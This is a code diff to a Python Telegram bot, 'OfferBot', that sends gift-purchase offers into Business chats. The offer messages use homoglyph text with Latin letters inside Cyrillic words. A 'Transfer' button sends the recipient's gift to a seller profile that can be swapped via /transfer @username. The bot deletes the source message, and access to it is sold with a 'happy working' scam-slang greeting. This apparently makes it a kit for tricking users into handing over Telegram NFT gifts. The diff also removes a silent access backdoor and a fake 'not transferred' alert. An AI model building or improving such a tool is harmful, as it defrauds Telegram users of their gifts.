@@ -30,6 +30,7 @@ dp = Dispatcher()
 offer_locks = {}
 awaiting_broadcast = set()
 awaiting_support = set()
+awaiting_banner = set()
 awaiting_profile_change = {}  # {admin_user_id: target_user_id}
 
 
@@ -39,16 +40,14 @@ def display_name(user) -> str:
 
 def instruction(locale="ru"):
     return (
-        "<b>📘 КАК ПОЛЬЗОВАТЬСЯ OFFERBOT</b>\n"
-        "<blockquote>Бесплатный бот для отправки оферов на подарки.</blockquote>\n"
-        "<b>1.</b> Откройте <b>Настройки → Telegram для бизнеса → Чат-боты</b>.\n"
-        "<b>2.</b> Подключите OfferBot и разрешите доступ к сообщениям.\n"
-        "<b>3.</b> В Business-чате отправьте офер в формате:\n"
-        "<blockquote><code>офер https://t.me/nft/PartySparkler-140864 150 stars</code></blockquote>\n"
-        "<b>Валюта:</b> <code>stars</code>, <code>gram</code> или <code>₽</code>.\n"
-        "<b>Язык:</b> в конце добавьте <code>en</code>, <code>cn</code> или <code>ar</code>.\n"
-        "<b>Получатель подарка:</b> <code>/transfer @username</code>.\n\n"
-        "🆓 <b>Все функции бесплатны.</b>"
+        "<b>ОСНОВНАЯ КОМАНДА НА РУССКОМ ЯЗЫКЕ:</b>\n"
+        "<blockquote>Оф https://t.me/nft/PartySparkler-140864 150 stars</blockquote>\n"
+        "<b>Доступные языки:</b>\n\n"
+        "Английский\n<blockquote>В конце команды: англ/en</blockquote>\n"
+        "Арабский\n<blockquote>В конце команды: араб</blockquote>\n"
+        "Китайский\n<blockquote>В конце команды: кидай</blockquote>\n\n"
+        "<b>Изменить профиль в кнопке «Передать» по команде:</b>\n"
+        "<blockquote>/transfer @username</blockquote>"
     )
 
 
@@ -75,10 +74,8 @@ def offer_keyboard(offer_id: int, locale: str, currency: str = ""):
 def transfer_keyboard(url: str, locale: str, offer_id: int):
     # Используем Three-Per-Em Space (\u2004) для центрирования текста
     labels = {"ru": "Передать\u2004", "en": "Transfer\u2004", "cn": "转赠\u2004", "ar": "نقل الهدية"}
-    done_labels = {"ru": "\u2004Готово\u2004", "en": "\u2004Done\u2004", "cn": "\u2004完成\u2004", "ar": "\u2004تم\u2004"}
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=labels.get(locale, labels["ru"]), icon_custom_emoji_id=TRANSFER_EMOJI_ID, url=url)],
-        [InlineKeyboardButton(text=done_labels.get(locale, done_labels["ru"]), icon_custom_emoji_id=PREMIUM_EMOJI_ID, callback_data=f"of:done:{offer_id}")]
+        [InlineKeyboardButton(text=labels.get(locale, labels["ru"]), icon_custom_emoji_id=TRANSFER_EMOJI_ID, url=url)]
     ])
 
 
@@ -90,13 +87,11 @@ def subscription_keyboard():
 
 
 def main_menu_keyboard(user_id: int | None = None):
-    rows = [
-        [InlineKeyboardButton(text="� Купить доступ", callback_data="buy_access")],
-        [InlineKeyboardButton(text="�👤 Мой кабинет", callback_data="my_profile")],
-        [InlineKeyboardButton(text="📘 Инструкция", callback_data="show_instruction")],
-        [InlineKeyboardButton(text="🛟 Техподдержка", callback_data="support_start")]
-    ]
-    return InlineKeyboardMarkup(inline_keyboard=rows)
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Купить", callback_data="buy_access")],
+        [InlineKeyboardButton(text="Инструкция", callback_data="show_instruction")],
+        [InlineKeyboardButton(text="Я чайник", callback_data="support_start")],
+    ])
 
 
 def purchase_success_keyboard():
@@ -108,7 +103,8 @@ def purchase_success_keyboard():
 
 def admin_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📊 Статистика", callback_data="adm:stats:0")],
+        [InlineKeyboardButton(text="Статистика", callback_data="adm:stats:0")],
+        [InlineKeyboardButton(text="Изменить баннер", callback_data="adm:banner:0")],
         [InlineKeyboardButton(text="🔌 Подключения", callback_data="adm:connections:0"),
          InlineKeyboardButton(text="📣 Рассылка", callback_data="adm:broadcast:0")],
         [InlineKeyboardButton(text="🟢 Выдать доступ по @username", callback_data="adm:allow_username:0")],
@@ -150,11 +146,8 @@ async def get_connection(connection_id: str):
 
 async def process_offer(message: Message, business_connection_id: str | None = None):
     text = message.text or message.caption or ""
-    plain_currency = text.strip().lower().startswith((".оффер", ".offer2"))
+    plain_currency = False
     parsed = parse_offer(text)
-    if text.strip().lower() in {".офер", ".offer", "офер", "offer"}:
-        await reply_message(message, instruction())
-        return
     if parsed.get("error"):
         await reply_message(message, error_text(parsed["error"]))
         return
@@ -219,7 +212,7 @@ async def process_offer(message: Message, business_connection_id: str | None = N
     transfer_username = profile["name"] if profile and profile["name"] else seller_username
     transfer_url = (f"tg://send_gift?to={transfer_username.lstrip('@')}" if transfer_username else f"tg://user?id={seller_id}")
     now = datetime.now(timezone.utc)
-    expires = make_expiry(now, cfg.offer_expire_hours)
+    expires = make_expiry(now, 23 + 59 / 60)
     data = dict(seller_id=seller_id, seller_username=seller_username, buyer_id=buyer_id,
                 buyer_username=buyer_username, buyer_url=buyer_url, gift_name=parsed["gift_name"],
                 gift_number=parsed["gift_number"], gift_url=parsed["gift_url"], amount=parsed["amount"],
@@ -250,18 +243,23 @@ async def process_offer(message: Message, business_connection_id: str | None = N
     elif parsed["locale"] == "ar":
         body = f"المستخدم <b>{seller_name}</b> يعرض <b>{amount}</b> مقابل الهدية <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nينتهي العرض خلال <b>{remaining}</b>."
     else:
-        body = f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>{amount}</b> зa пoдaрoк <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nСдeлкa aктивнa <b>{remaining}</b>."
+        body = f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>{amount}</b> зa пoдaрoк <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nСдeлкa aктивнa <b>{remaining}</b>.\n\nПредложение актуально в течении 23ч 59м…"
+    markup = offer_keyboard(offer_id, parsed["locale"], parsed["currency"])
+    log.info("OFFER_SEND_REQUEST offer_id=%s chat_id=%s business_connection_id=%s", offer_id, buyer_id, business_connection_id)
+    log.info("REPLY_MARKUP_PRESENT offer_id=%s present=%s", offer_id, bool(markup and markup.inline_keyboard))
     try:
         sent = await safe_send_business(business_connection_id, buyer_id, text=body,
-            reply_markup=offer_keyboard(offer_id, parsed["locale"], parsed["currency"]),
+            reply_markup=markup,
             link_preview_options=LinkPreviewOptions(url=parsed["gift_url"], show_above_text=True))
+        log.info("OFFER_SEND_SUCCESS offer_id=%s telegram_message_id=%s", offer_id, sent.message_id)
+        log.info("OFFER_MESSAGE_ID offer_id=%s message_id=%s chat_id=%s", offer_id, sent.message_id, buyer_id)
     except Exception as e:
-        log.exception("[OFFER SEND] offer_id=%s chat_id=%s business_connection_id=%s error=%s", offer_id, buyer_id, business_connection_id, e)
+        log.exception("OFFER_SEND_ERROR offer_id=%s chat_id=%s business_connection_id=%s", offer_id, buyer_id, business_connection_id)
         db.delete_offer(offer_id)
         await reply_message(message, "❌ Не удалось отправить офер. Попробуйте ещё раз позже.")
         return
     db.set_offer_message(offer_id, buyer_id, sent.message_id)
-    log.info("[OFFER SEND] offer_id=%s chat_id=%s business_connection_id=%s", offer_id, buyer_id, business_connection_id)
+    log.info("OFFER_SEND_SUCCESS_STORED offer_id=%s chat_id=%s message_id=%s", offer_id, buyer_id, sent.message_id)
     await delete_source(message, business_connection_id)
 
 
@@ -342,12 +340,12 @@ async def on_start(message: Message):
         await show_payment_options(message, user.id, pending)
         return
     
-    await message.answer(
-        "<b>✦ OFFERBOT</b>\n"
-        "<blockquote>Оферы на подарки</blockquote>\n"
-        "Выберите раздел ниже 👇",
-        reply_markup=main_menu_keyboard(user.id),
-    )
+    banner_file_id = db.get_setting("start_banner_file_id")
+    caption = "<blockquote>Привет, выбери действие</blockquote>"
+    if banner_file_id:
+        await message.answer_photo(banner_file_id, caption=caption, reply_markup=main_menu_keyboard(user.id))
+    else:
+        await message.answer(caption, reply_markup=main_menu_keyboard(user.id))
 
 
 async def is_channel_subscriber(user_id: int) -> bool:
@@ -708,17 +706,13 @@ async def back_to_start_callback(call: CallbackQuery):
         return
     
     try:
-        await call.message.edit_text(
-            "<b>✦ OFFERBOT</b>\n"
-            "<blockquote>Оферы на подарки</blockquote>\n"
-            "Выберите раздел ниже 👇",
+        await call.message.answer(
+            "<blockquote>Привет, выбери действие</blockquote>",
             reply_markup=main_menu_keyboard(call.from_user.id),
         )
     except Exception:
         await call.message.answer(
-            "<b>✦ OFFERBOT</b>\n"
-            "<blockquote>Оферы на подарки</blockquote>\n"
-            "Выберите раздел ниже 👇",
+            "<blockquote>Привет, выбери действие</blockquote>",
             reply_markup=main_menu_keyboard(call.from_user.id),
         )
     await call.answer()
@@ -726,8 +720,13 @@ async def back_to_start_callback(call: CallbackQuery):
 
 @dp.callback_query(F.data == "show_instruction")
 async def show_instruction_callback(call: CallbackQuery):
+    if not call.from_user or not db.has_access(call.from_user.id, cfg.owner_id, cfg.offer_access_mode):
+        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Купить", callback_data="buy_access")], [InlineKeyboardButton(text="В меню", callback_data="back_to_start")]])
+        await call.message.answer("Для просмотра инструкции сначала необходим активный доступ.", reply_markup=kb)
+        await call.answer()
+        return
     try:
-        rows = [[InlineKeyboardButton(text="« В меню", callback_data="back_to_start")]]
+        rows = [[InlineKeyboardButton(text="В меню", callback_data="back_to_start")]]
         await call.message.edit_text(instruction(), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
     except Exception:
         await call.message.answer(instruction())
@@ -782,6 +781,19 @@ async def on_business_message(message: Message):
 
 @dp.message()
 async def on_message(message: Message):
+    if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_banner:
+        if (message.text or "").strip().lower() == "/cancel":
+            awaiting_banner.discard(cfg.owner_id)
+            await message.answer("Изменение баннера отменено.")
+            return
+        if not message.photo:
+            await message.answer("Отправьте фотографию как фото, не как файл. Для отмены: /cancel")
+            return
+        db.set_setting("start_banner_file_id", message.photo[-1].file_id)
+        awaiting_banner.discard(cfg.owner_id)
+        log.info("START_BANNER_UPDATED admin_id=%s file_id_saved=true", cfg.owner_id)
+        await message.answer("Баннер обновлён. Он будет использоваться в следующих сообщениях /start.", reply_markup=admin_keyboard())
+        return
     if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_broadcast:
         if (message.text or "").strip().lower() == "/cancel":
             awaiting_broadcast.discard(cfg.owner_id)
@@ -860,173 +872,9 @@ async def handle_text(message: Message, is_business: bool):
             await reply_message(message, "❌ Эта команда предназначена для Business-чата.")
         return
     
-    # Тесты с использованием латинских букв вместо кириллицы (как в оригинале)
-    if low == "офер0" or low == "offer0":
-        await reply_message(message, "User")
-        return
-    
-    # === РУССКИЙ ЯЗЫК: Тест по одному слову ===
-    if low == "офер1" or low == "offer1":
-        await reply_message(message, "Пoльзoвaтeль")
-        return
-    if low == "офер2" or low == "offer2":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b>")
-        return
-    if low == "офер3" or low == "offer3":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт")
-        return
-    if low == "офер4" or low == "offer4":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм")
-        return
-    if low == "офер5" or low == "offer5":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150</b>")
-        return
-    if low == "офер6" or low == "offer6":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b>")
-        return
-    if low == "офер7" or low == "offer7":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa")
-        return
-    if low == "офер8" or low == "offer8":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк")
-        return
-    if low == "офер9" or low == "offer9":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк <a href=\"{gift_url}\">{title}</a>")
-        return
-    if low == "офер10" or low == "offer10":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк <a href=\"{gift_url}\">{title}</a>.")
-        return
-    if low == "офер11" or low == "offer11":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк <a href=\"{gift_url}\">{title}</a>.\n\nПрeдлoжeниe")
-        return
-    if low == "офер12" or low == "offer12":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк <a href=\"{gift_url}\">{title}</a>.\n\nСдeлкa aктивнa")
-        return
-    if low == "офер13" or low == "offer13":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк <a href=\"{gift_url}\">{title}</a>.\n\nСдeлкa aктивнa <b>24ч</b>")
-        return
-    if low == "офер14" or low == "offer14":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк <a href=\"{gift_url}\">{title}</a>.\n\nСдeлкa aктивнa <b>24ч</b>.",
-                           reply_markup=offer_keyboard(0, "ru", "gram"))
-        return
-    
-    # === АНГЛИЙСКИЙ ЯЗЫК: Тест по одному слову ===
-    if low == "тест1" or low == "test1":
-        await reply_message(message, "Usеr")
-        return
-    if low == "тест2" or low == "test2":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        await reply_message(message, f"Usеr <b>{seller_name}</b>")
-        return
-    if low == "тест3" or low == "test3":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers")
-        return
-    if low == "тест4" or low == "test4":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150</b>")
-        return
-    if low == "тест5" or low == "test5":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b>")
-        return
-    if low == "тест6" or low == "test6":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr")
-        return
-    if low == "тест7" or low == "test7":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе")
-        return
-    if low == "тест8" or low == "test8":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift")
-        return
-    if low == "тест9" or low == "test9":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift <a href=\"{gift_url}\">{title}</a>")
-        return
-    if low == "тест10" or low == "test10":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift <a href=\"{gift_url}\">{title}</a>.")
-        return
-    if low == "тест11" or low == "test11":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift <a href=\"{gift_url}\">{title}</a>.\n\nОffer")
-        return
-    if low == "тест12" or low == "test12":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift <a href=\"{gift_url}\">{title}</a>.\n\nОffer ехpires")
-        return
-    if low == "тест13" or low == "test13":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift <a href=\"{gift_url}\">{title}</a>.\n\nDeal is active")
-        return
-    if low == "тест14" or low == "test14":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift <a href=\"{gift_url}\">{title}</a>.\n\nDeal is active <b>24h</b>")
-        return
-    if low == "тест15" or low == "test15":
-        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
-        gift_url = "https://t.me/nft/PartySparkler-140864"
-        title = "Party Sparkler #140864"
-        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift <a href=\"{gift_url}\">{title}</a>.\n\nDeal is active <b>24h</b>.",
-                           reply_markup=offer_keyboard(0, "en", "gram"))
-        return
-    
-    # Поддерживаем разные варианты команды офер (с точкой и без)
-    if (low.startswith(".оффер") or low.startswith(".офер") or low.startswith(".offer") or
-            low.startswith("оффер ") or low.startswith("офер ") or low.startswith("offer ")):
+    # Принимаем только новый префикс «Оф» (регистр не учитывается).
+    if low.startswith("оф ") or low.startswith(".оф ") or low in {"оф", ".оф"}:
         await process_offer(message, message.business_connection_id if is_business else None)
-        return
-    # Секретная команда: не добавлять её в меню команд Telegram.
-    # Доступ выдаётся автоматически, без уведомления/подтверждения владельца.
-    if low == "/code free" and not is_business and message.from_user:
-        user = message.from_user
-        db.register_user(user.id, user.username, user.first_name, user.last_name)
-        db.add_access(user.id)
-        db.unblock_offer_user(user.id)
-        connection = db.get_connection_for_user(user.id)
-        if connection:
-            db.set_connection_blocked(connection["connection_id"], False)
-        await reply_message(message, "✅ Доступ активирован! Удачного ворка! Смотри инструкцию 📘")
         return
     if low.startswith("/admin") or low.startswith("/админ"):
         await admin_command(message)
@@ -1152,6 +1000,12 @@ async def admin_callback(call: CallbackQuery):
     except ValueError:
         offset = 0
 
+    if action == "banner":
+        awaiting_banner.add(cfg.owner_id)
+        await call.answer()
+        await call.message.answer("Отправьте новую фотографию баннера. Она будет показана вместе с текстом «Привет, выбери действие» и кнопками /start. Для отмены: /cancel")
+        return
+
     if action == "allow_username":
         await call.answer()
         await call.message.answer("Чтобы выдать доступ по username, отправь команду: <code>/allow @username</code>. Пользователь должен хотя бы раз запустить бота.")
@@ -1245,61 +1099,13 @@ async def admin_callback(call: CallbackQuery):
 
 @dp.callback_query(F.data.startswith("of:"))
 async def offer_callback(call: CallbackQuery):
+    log.info("OFFER_CALLBACK offer_id_data=%s user_id=%s message_id=%s", call.data, call.from_user.id if call.from_user else None, call.message.message_id if call.message else None)
     parts = call.data.split(":")
     if len(parts) < 3 or not parts[2].isdigit():
         await call.answer("Некорректный офер.", show_alert=True); return
     
     offer_id = int(parts[2])
     action = parts[1]
-    
-    # Обработка кнопки "Готово"
-    if action == "done":
-        offer = db.get_offer(offer_id)
-        if not offer:
-            await call.answer("Офер не найден.", show_alert=True)
-            return
-        
-        title = gift_title(offer["gift_name"], offer["gift_number"])
-        
-        # Создаём inline keyboard с кнопкой OK
-        ok_labels = {"ru": "OK", "en": "OK", "cn": "确定", "ar": "حسنا"}
-        ok_keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(
-                text=ok_labels.get(offer["locale"], "OK"),
-                icon_custom_emoji_id=PREMIUM_EMOJI_ID,
-                callback_data=f"of:ok:{offer_id}"
-            )
-        ]])
-        
-        # Текст предупреждения
-        if offer["locale"] == "ru":
-            warning_text = (
-                f"Подарок {title} не передан покупателю.\n\n"
-                f"Проверьте что подарок успешно отправлен покупателю и повторите попытку ещё раз."
-            )
-        elif offer["locale"] == "cn":
-            warning_text = (
-                f"礼物 {title} 尚未转交给买家。\n\n"
-                f"请确认礼物已成功发送给买家，然后再试一次。"
-            )
-        elif offer["locale"] == "ar":
-            warning_text = (
-                f"الهدية {title} لم يتم نقلها إلى المشتري.\n\n"
-                f"تحقق من نجاح إرسال الهدية إلى المشتري وحاول مرة أخرى."
-            )
-        else:
-            warning_text = (
-                f"Gift {title} hаs nоt bееn trаnsfеrrеd tо thе buyеr.\n\n"
-                f"Plеаsе vеrify thаt thе gift wаs suссеssfully sеnt tо thе buyеr аnd try аgаin."
-            )
-        
-        await call.answer(warning_text, show_alert=True)
-        return
-    
-    # Обработка кнопки OK после предупреждения
-    if action == "ok":
-        await call.answer()
-        return
     
     # Обработка принятия/отклонения офера
     if action not in {"accept", "decline"}:
@@ -1309,6 +1115,9 @@ async def offer_callback(call: CallbackQuery):
         offer_locks[offer_id] = asyncio.Lock()
     async with offer_locks[offer_id]:
         offer = db.get_offer(offer_id)
+        if offer and offer["status"] == "pending" and offer.get("expires_at") and offer["expires_at"] <= datetime.now(timezone.utc):
+            db.update_offer_status(offer_id, "expired")
+            offer = db.get_offer(offer_id)
         if not offer or offer["status"] != "pending":
             await call.answer("Офер уже обработан.", show_alert=True); return
         if not call.message or call.message.message_id != offer["message_id"] or call.message.chat.id != offer["message_chat_id"]:
